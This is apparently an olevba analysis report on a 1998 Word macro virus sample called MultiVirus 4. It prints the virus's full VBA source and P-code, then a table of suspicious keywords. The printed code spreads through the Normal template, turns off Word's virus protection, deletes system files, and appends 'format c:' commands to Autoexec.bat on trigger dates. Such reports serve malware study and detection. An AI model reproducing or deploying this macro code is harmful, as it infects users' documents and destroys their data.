olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.MultiVirus.4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.MultiVirus.4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MultiVirus4.bas 
in file: ./Virus.MSWord.MultiVirus.4 - OLE stream: 'Macros/VBA/MultiVirus4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
' Macro Virus Epidemic
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
If D$ = "10/10" Then
    Kill "C:\Command.com"
    Kill "C:\Autoexec.bat"
    Kill "C:\Config.sys"
    MsgBox "Epidemic Macro Virus V1.2", Title:="Virus MultiVirus 4"
End If
If D$ = "27/04" Then
    Open "C:\Autoexec.bat" For Append As #1
        Print #1, "PATH=%PATH%;C:\DOS;C:\WINDOWS\COMMAND"
        Print #1, "echo o|format c: /u /V:EPIDEMIC >nul"
        Print #1, "echo y|format c: /u /V:EPIDEMIC >nul"
    Close #1
End If
ErrorAE:
End Sub
Sub AutoClose()
' Macro Virus Divina
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAC
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "MultiVirus4" Then
        MultiVirus4Installed = -1
    End If
Next i
If Not MultiVirus4Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
End If
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 5)
T$ = Mid(MyTime, 4, 5)
If T$ = "17" Then
    MsgBox "Disque Dur endommagй. Dйmarrer l'antivirus ?" & Chr$(13) & "Virus 'MultiVirus 4' est lancй", vbInformation, Title:="Microsoft Word"
    MsgBox "Sortez de votre systиme et lancer un formatage de bas niveau" & Chr$(13) & "Virus stoppй", vbInformation, Title:="Microsoft Word"
    MsgBox "Sortir du systиme ?" & Chr$(13) & "Microsoft Windows", vbInformation, "Microsoft Word"
End If
If D$ = "21/05" Then
    Select Case T$
        Case "11" To "19", "17", "41" To "49"
            MsgBox "DIVINA IS THE BEST!!!" & Chr$(13) & "zio Massimo", Title:="Virus MultiVirus 4"
            MsgBox "Aujourd'hui, c'est l'anniversaire de Divina: On doit faire la fкte!" & Chr$(13) & "Ne continuer pas ou je devrais formater le disque dur..." & Chr$(13) & "Virus 'DIVINA' est exйcutй", Title:="Virus MultiVirus 4"
    End Select
End If
ErrorAC:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "MultiVirus4" Then
        MultiVirus4Installed = -1
    End If
Next i
If Not MultiVirus4Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
    ' Macro Virus Dodger
    Beep
    MsgBox "*** tHe aRtFuL dOdGeR ***", Title:="Virus MultiVirus 4"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
' Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorFT:
End Sub
Sub ToolsMacro()
' Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorTM:
End Sub
Sub ToolsOptions()
'Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTO
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorTO:
End Sub
Sub ViewVBCode()
' Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorVVBC:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.MultiVirus.4
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MultiVirus4 - 8138 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	QuoteRem 0x0000 0x0015 " Macro Virus Epidemic"
' Line #2:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	OnError ErrorAE 
' Line #7:
' 	Dim 
' 	VarDefn MyDate
' Line #8:
' 	Ld Date 
' 	St MyDate 
' Line #9:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #10:
' 	Ld D$ 
' 	LitStr 0x0005 "10/10"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x000E "C:\Command.com"
' 	ArgsCall Kill 0x0001 
' Line #12:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	LitStr 0x000D "C:\Config.sys"
' 	ArgsCall Kill 0x0001 
' Line #14:
' 	LitStr 0x0019 "Epidemic Macro Virus V1.2"
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld D$ 
' 	LitStr 0x0005 "27/04"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "PATH=%PATH%;C:\DOS;C:\WINDOWS\COMMAND"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "echo o|format c: /u /V:EPIDEMIC >nul"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "echo y|format c: /u /V:EPIDEMIC >nul"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Label ErrorAE 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub AutoClose())
' Line #26:
' 	QuoteRem 0x0000 0x0013 " Macro Virus Divina"
' Line #27:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #28:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #31:
' 	OnError ErrorAC 
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroCount 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #34:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "MultiVirus4"
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiVirus4Installed 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	Ld MultiVirus4Installed 
' 	Not 
' 	IfBlock 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #44:
' 	Ld Date 
' 	St MyDate 
' Line #45:
' 	Ld Time 
' 	St MyTime 
' Line #46:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #47:
' 	Ld MyTime 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St T$ 
' Line #48:
' 	Ld T$ 
' 	LitStr 0x0002 "17"
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LitStr 0x002C "Disque Dur endommagй. Dйmarrer l'antivirus ?"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001E "Virus 'MultiVirus 4' est lancй"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #50:
' 	LitStr 0x003C "Sortez de votre systиme et lancer un formatage de bas niveau"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000C "Virus stoppй"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000E "Microsoft Word"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0003 
' Line #51:
' 	LitStr 0x0013 "Sortir du systиme ?"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0011 "Microsoft Windows"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld D$ 
' 	LitStr 0x0005 "21/05"
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Ld T$ 
' 	SelectCase 
' Line #55:
' 	LitStr 0x0002 "11"
' 	LitStr 0x0002 "19"
' 	CaseTo 
' 	LitStr 0x0002 "17"
' 	Case 
' 	LitStr 0x0002 "41"
' 	LitStr 0x0002 "49"
' 	CaseTo 
' 	CaseDone 
' Line #56:
' 	LitStr 0x0015 "DIVINA IS THE BEST!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000B "zio Massimo"
' 	Concat 
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #57:
' 	LitStr 0x0043 "Aujourd'hui, c'est l'anniversaire de Divina: On doit faire la fкte!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0038 "Ne continuer pas ou je devrais formater le disque dur..."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001A "Virus 'DIVINA' est exйcutй"
' 	Concat 
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #58:
' 	EndSelect 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Label ErrorAC 
' Line #61:
' 	EndSub 
' Line #62:
' 	FuncDefn (Sub AutoOpen())
' Line #63:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #64:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #65:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #67:
' 	OnError ErrorAO 
' Line #68:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroCount 
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #70:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "MultiVirus4"
' 	Eq 
' 	IfBlock 
' Line #71:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiVirus4Installed 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	Ld MultiVirus4Installed 
' 	Not 
' 	IfBlock 
' Line #75:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #76:
' 	QuoteRem 0x0004 0x0013 " Macro Virus Dodger"
' Line #77:
' 	ArgsCall Beep 0x0000 
' Line #78:
' 	LitStr 0x0019 "*** tHe aRtFuL dOdGeR ***"
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Label ErrorAO 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub FileSaveAs())
' Line #83:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #84:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #87:
' 	OnError ErrorFSA 
' Line #88:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #89:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #90:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus4"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #93:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #94:
' 	Label ErrorFSA 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub FileTemplates())
' Line #97:
' 	QuoteRem 0x0000 0x0013 " Macro Virus Master"
' Line #98:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #99:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #100:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #102:
' 	OnError ErrorFT 
' Line #103:
' 	LitStr 0x001A "© 1998 Master of infection"
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #104:
' 	Label ErrorFT 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub ToolsMacro())
' Line #107:
' 	QuoteRem 0x0000 0x0013 " Macro Virus Master"
' Line #108:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #109:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #110:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #111:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #112:
' 	OnError ErrorTM 
' Line #113:
' 	LitStr 0x001A "© 1998 Master of infection"
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #114:
' 	Label ErrorTM 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub ToolsOptions())
' Line #117:
' 	QuoteRem 0x0000 0x0012 "Macro Virus Master"
' Line #118:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #119:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #120:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #121:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #122:
' 	OnError ErrorTO 
' Line #123:
' 	LitStr 0x001A "© 1998 Master of infection"
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #124:
' 	Label ErrorTO 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub ViewVBCode())
' Line #127:
' 	QuoteRem 0x0000 0x0013 " Macro Virus Master"
' Line #128:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #129:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #130:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #131:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #132:
' 	OnError ErrorVVBC 
' Line #133:
' 	LitStr 0x001A "© 1998 Master of infection"
' 	LitStr 0x0012 "Virus MultiVirus 4"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #134:
' 	Label ErrorVVBC 
' Line #135:
' 	EndSub 
' Line #136:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

